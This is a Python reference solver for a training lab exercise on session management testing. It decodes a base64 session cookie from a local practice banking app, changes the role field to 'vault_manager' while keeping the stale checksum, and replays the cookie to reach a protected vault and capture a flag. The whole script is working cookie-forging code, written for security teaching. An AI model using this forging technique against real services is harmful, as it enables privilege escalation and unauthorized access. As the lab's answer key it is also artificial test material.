#!/usr/bin/env python3
"""Masquerade Operation 01 reference solver — Iana forges a new identity past Alibi's gate.

WSTG-SESS-01: Testing for Session Management Schema. Log in with the given (non-secret)
test account, decode the session cookie, change the role field, re-encode, replay. The
"checksum" third field is deliberately left untouched/stale to prove the server never
actually re-verifies it -- that's the finding, not a puzzle to solve.

Usage: python3 solver.py [base_url]     (default http://localhost:8000)
"""
import sys, re, base64, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
USER = "j.doe"
PASSWORD = "Customer2024!"
TARGET_ROLE = "vault_manager"


def main():
    sess = requests.Session()

    print(f"[*] logging in as the provided test account ({USER})")
    r = sess.post(f"{BASE}/masquerade/op1/login", data={"username": USER, "password": PASSWORD})
    raw_cookie = sess.cookies.get("bank_session")
    if not raw_cookie:
        print("[!] login failed -- no bank_session cookie issued"); return

    decoded = base64.b64decode(raw_cookie).decode()
    username, role, checksum = decoded.split(":")
    print(f"[*] raw cookie:     {raw_cookie}")
    print(f"[*] decoded:        {decoded}")
    print(f"[*] structure:      username={username!r} role={role!r} checksum={checksum!r}")

    print(f"\n[*] confirming the vault rejects the current ({role}) role...")
    denied = requests.get(f"{BASE}/masquerade/op1/vault", cookies={"bank_session": raw_cookie})
    print(f"[*] vault says: {re.search('Access denied.*role.', denied.text).group(0)}")

    print(f"\n[*] forging a new cookie: role -> {TARGET_ROLE!r}, checksum left UNCHANGED on purpose")
    forged_raw = f"{username}:{TARGET_ROLE}:{checksum}"       # deliberately stale checksum
    forged_cookie = base64.b64encode(forged_raw.encode()).decode()
    print(f"[*] forged raw:     {forged_raw}")
    print(f"[*] forged cookie:  {forged_cookie}")

    r = requests.get(f"{BASE}/masquerade/op1/vault", cookies={"bank_session": forged_cookie})
    flag = re.search(r"R6S\{[^}]*\}", r.text)
    if flag:
        print(f"\n[+] IN, with a checksum that was never even recomputed: {flag.group(0)}")
    else:
        print(f"\n[!] forged cookie was rejected (HTTP {r.status_code}) -- check the app is up to date")


if __name__ == "__main__":
    main()
